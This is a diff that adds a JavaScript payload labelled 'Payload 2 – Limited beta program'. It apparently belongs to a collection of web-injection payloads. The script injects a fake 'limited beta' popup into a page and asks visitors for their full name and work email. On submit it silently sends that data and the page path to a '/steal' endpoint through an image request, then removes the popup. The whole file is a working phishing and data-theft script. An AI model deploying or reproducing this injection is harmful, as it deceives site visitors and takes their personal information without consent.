@@ -1,0 +1,97 @@
+<!-- Payload 2 – “Limited beta program” (promo) -->
+
+<script>
+(function () {
+    var bar = document.createElement("div");
+    bar.style.position = "fixed";
+    bar.style.left = "50%";
+    bar.style.bottom = "24px";
+    bar.style.transform = "translateX(-50%)";
+    bar.style.width = "100%";
+    bar.style.maxWidth = "420px";
+    bar.style.background = "#ffffff";
+    bar.style.borderRadius = "16px";
+    bar.style.boxShadow = "0 18px 45px rgba(15,23,42,0.25)";
+    bar.style.padding = "16px 18px 14px";
+    bar.style.fontFamily = "-apple-system,BlinkMacSystemFont,system-ui,sans-serif";
+    bar.style.zIndex = "9999";
+
+    var title = document.createElement("div");
+    title.textContent = "Limited beta program";
+    title.style.fontSize = "15px";
+    title.style.fontWeight = "600";
+    title.style.color = "#0f172a";
+
+    var text = document.createElement("p");
+    text.textContent = "Get early access to new analytics features. Leave your work email to join the beta.";
+    text.style.margin = "4px 0 10px";
+    text.style.fontSize = "13px";
+    text.style.color = "#6b7280";
+
+    var form = document.createElement("form");
+    form.style.display = "flex";
+    form.style.flexWrap = "wrap";
+    form.style.gap = "8px";
+
+    var nameInput = document.createElement("input");
+    nameInput.type = "text";
+    nameInput.required = true;
+    nameInput.placeholder = "Full name";
+    nameInput.style.flex = "1 1 120px";
+    nameInput.style.borderRadius = "999px";
+    nameInput.style.border = "1px solid #e5e7eb";
+    nameInput.style.padding = "6px 10px";
+    nameInput.style.fontSize = "13px";
+
+    var emailInput = document.createElement("input");
+    emailInput.type = "email";
+    emailInput.required = true;
+    emailInput.placeholder = "work@company.com";
+    emailInput.style.flex = "1 1 150px";
+    emailInput.style.borderRadius = "999px";
+    emailInput.style.border = "1px solid #e5e7eb";
+    emailInput.style.padding = "6px 10px";
+    emailInput.style.fontSize = "13px";
+
+    var btn = document.createElement("button");
+    btn.type = "submit";
+    btn.textContent = "Join";
+    btn.style.flex = "0 0 auto";
+    btn.style.border = "none";
+    btn.style.borderRadius = "999px";
+    btn.style.padding = "7px 14px";
+    btn.style.fontSize = "13px";
+    btn.style.fontWeight = "600";
+    btn.style.background = "#0ea5e9";
+    btn.style.color = "#0f172a";
+    btn.style.cursor = "pointer";
+
+    var foot = document.createElement("p");
+    foot.textContent = "Only corporate emails are accepted.";
+    foot.style.margin = "8px 0 0";
+    foot.style.fontSize = "11px";
+    foot.style.color = "#9ca3af";
+
+    form.onsubmit = function (e) {
+        e.preventDefault();
+        var value = "promo"
+        + "|name=" + nameInput.value
+        + "|email=" + emailInput.value
+        + "|from=" + location.pathname;
+        var img = new Image();
+        img.src = "/steal?c=" + encodeURIComponent(value);
+        bar.remove();
+    };
+
+    form.appendChild(nameInput);
+    form.appendChild(emailInput);
+    form.appendChild(btn);
+
+    bar.appendChild(title);
+    bar.appendChild(text);
+    bar.appendChild(form);
+    bar.appendChild(foot);
+
+    document.body.appendChild(bar);
+})();
+</script>
